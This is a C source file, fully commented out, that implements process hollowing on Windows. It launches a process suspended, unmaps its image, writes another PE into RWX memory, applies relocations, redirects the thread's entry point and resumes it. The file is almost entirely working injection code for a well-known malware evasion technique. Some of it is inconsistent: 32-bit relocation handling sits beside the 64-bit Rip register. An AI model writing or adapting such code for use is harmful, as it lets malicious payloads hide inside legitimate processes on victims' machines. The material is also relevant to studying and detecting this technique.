//#include "Techniques.h"
//#include "macros.h"
//#include "structs.h"
//
//
//
//
//
//
//
//int ProcessHollowing(peinfos infos,char *path)
//{
//
//	int errorcount;
//	int HIGHLOW = 0;
//	int x64 = 0;
//	int absolute = 0;
//	BYTE* BaseAddress = infos.pe;
//	NtUnmapViewOfSection_t NtUnmapViewOfSection = NULL;
//	NtQueryInformationProcess_t NtQueryInformationProcess = NULL;
//	//okay("0x%p", infos.ntHeader->OptionalHeader.DataDirectory[1].VirtualAddress);
//	//infos.ntHeader->OptionalHeader.DataDirectory[1].VirtualAddress = 0x00000000000038F8;
//	
//	STARTUPINFOA si = { 0 };
//	PROCESS_INFORMATION pi = { 0 };
//	si.cb = sizeof(si);
//	_PROCESS_BASIC_INFORMATION pbi;
//	PVOID baseAddress = NULL;
//	BYTE* NewAddress = NULL;
//
//	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
//	if (hNtDll == NULL)
//	{
//		error("Failed To Get NtDll Handle");
//		return -1;
//	}
//	okay("Got Handle To NtDll");
//	if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
//		
//		error("CreateProcessA failed: %lu", GetLastError());
//		return -1;
//	} 
//	
//	okay("Process Created In A susspeneded State PID(%d)", pi.dwProcessId);
//	NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtDll, "NtQueryInformationProcess");
//	if (!NtQueryInformationProcess) {
//		error("Failed To Get NtQueryInformationProcess Address");
//		return -1;
//	}
//
//	NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
//	if (status != 0) {
//		error("Failed To Read Process Informations (NTSTATUS: 0x%X)", status);
//	}
//	okay("Got Peb BASEADDRESS(0x%p)", pbi.PebBaseAddress);
//	
//	//
//	if (!pbi.PebBaseAddress) {
//		error("PEB Base Address is NULL");
//	}
//
//	if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &baseAddress, sizeof(PVOID), NULL)) {
//		error("Failed to read ImageBaseAddress from target PEB");
//	}
//	okay("Remote Image Base Address Is 0x%p", baseAddress);
//	
//	
//	
//	
//	NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtDll, "NtUnmapViewOfSection");
//	if (NtUnmapViewOfSection == NULL)
//	{
//		error("Failed To Get NtUnmapViewOfSection address");
//		return -1;
//	}
//	//g
//	status = NtUnmapViewOfSection(pi.hProcess, baseAddress);
//	if (status != 0) {
//		error("Failed To Unmap Process base address section (NTSTATUS: 0x%X)", status);
//	}
//	okay("Unmapped The Target process");
//	NewAddress = VirtualAllocEx(pi.hProcess, baseAddress, infos.ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//	if (NewAddress == NULL)
//	{
//		error("Failed to allocate space at the unmapped address");
//	}
//	okay("Allocated Space At 0x%p",NewAddress);
//	WriteProcessMemory(pi.hProcess, NewAddress, infos.pe, infos.ntHeader->OptionalHeader.SizeOfHeaders, NULL);
//	okay("Headers Written Into Target Process");
//	PIMAGE_SECTION_HEADER sectionHeader = infos.sectionHeader;
//	okay("Found %d Sections", infos.ntHeader->FileHeader.NumberOfSections);
//	for (int i = 0; i != infos.ntHeader->FileHeader.NumberOfSections; i++, sectionHeader++)
//	{
//		if (!WriteProcessMemory(pi.hProcess, NewAddress + sectionHeader->VirtualAddress, infos.pe + sectionHeader->PointerToRawData,sectionHeader->SizeOfRawData, NULL))
//		{
//			error("Failed To Write Section %d Into Hollowed Process", i);
//		}
//		else
//		{
//			okay("Section %s Written At 0x%p", sectionHeader->Name, sectionHeader->VirtualAddress);
//		}
//	}
//	okay("Sections Written Into Target Process");
//	//Base Relocations
//	okay("Now Preforming base relocations --------");
//	DWORD relocDirSize = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
//	DWORD relocRVA = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
//	DWORD Delta = (DWORD)(NewAddress - infos.ntHeader->OptionalHeader.ImageBase);
//	IMAGE_DATA_DIRECTORY relocDir = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
//
//	if (Delta != 0)
//	{
//		okay("Delta is not zero Base Relocations Needed (0x%p)", Delta);
//
//		DWORD bytesRead;
//
//		IMAGE_BASE_RELOCATION* relocData = (IMAGE_BASE_RELOCATION*)malloc(relocDirSize);
//
//		if (!ReadProcessMemory(pi.hProcess, NewAddress + relocRVA, relocData, relocDirSize, &bytesRead) || bytesRead != relocDirSize) {
//			printf("[-] Failed to read relocation data\n");
//			free(relocData);
//			return;
//		}
//		IMAGE_BASE_RELOCATION* currentBlock = relocData;
//		while ((DWORD)currentBlock < (DWORD)relocData + relocDirSize && currentBlock->SizeOfBlock)
//		{
//			DWORD entriesCount = (currentBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
//			WORD* entries = (WORD*)(currentBlock + 1);
//
//			for (DWORD i = 0; i < entriesCount; i++)
//			{
//				if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
//				{
//					DWORD rva = currentBlock->VirtualAddress + (entries[i] & 0xFFF);
//					DWORD value;
//					if (!ReadProcessMemory(pi.hProcess, NewAddress + rva, &value, sizeof(DWORD), NULL)) {
//						printf("[-] Failed to read relocation target\n");
//						continue;
//					}
//					value += Delta;
//
//					if (!WriteProcessMemory(pi.hProcess, NewAddress + rva, &value, sizeof(DWORD), NULL)) {
//						printf("[-] Failed to write relocation\n");
//					}
//
//
//				}
//			}
//			currentBlock = (IMAGE_BASE_RELOCATION*)((BYTE*)currentBlock + currentBlock->SizeOfBlock);
//		}
//		free(relocData);
//		okay("Preformed Base Relocations");
//
//	}
//	else
//	{
//		okay("No Relocations Needed Delta (0x%p)", Delta);
//	}
//
//	CONTEXT ctx;
//	ZeroMemory(&ctx, sizeof(CONTEXT));
//	ctx.ContextFlags = CONTEXT_FULL;
//	if (!GetThreadContext(pi.hThread, &ctx)) {
//		error("GetThreadContext failed: %lu\n", GetLastError());
//		return -1;
//	}
//
//	okay("Got Thread Context");
//	printf("[+] Original EIP: 0x%08lx\n", ctx.Rip);
//	ctx.Rip = (DWORD_PTR)(NewAddress + infos.ntHeader->OptionalHeader.AddressOfEntryPoint);
//	okay("Address Of Entry Point 0x%p ADDRESS (0x%p)", infos.ntHeader->OptionalHeader.AddressOfEntryPoint,NewAddress);
//
//	printf("[+] Thread context updated. New EIP: 0x%08X\n", ctx.Rip);
//	
//	if (!SetThreadContext(pi.hThread, &ctx)) {
//		error("SetThreadContext failed: %lu\n", GetLastError());
//		return -1;
//	}
//	okay("About to resume thread with entry point at: 0x%p",
//		NewAddress + infos.ntHeader->OptionalHeader.AddressOfEntryPoint);
//
//	if (ResumeThread(pi.hThread) == (DWORD)-1) {
//		error("Failed to resume thread: %lu\n", GetLastError());
//		return -1;
//	}
//	okay("Thread Resumed");
//	WaitForSingleObjectEx(pi.hThread, INFINITE, FALSE);
//	DWORD exitCode;
//	if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
//		printf("Process exited with code: 0x%X\n", exitCode);
//	}
//	return 0;
//
//}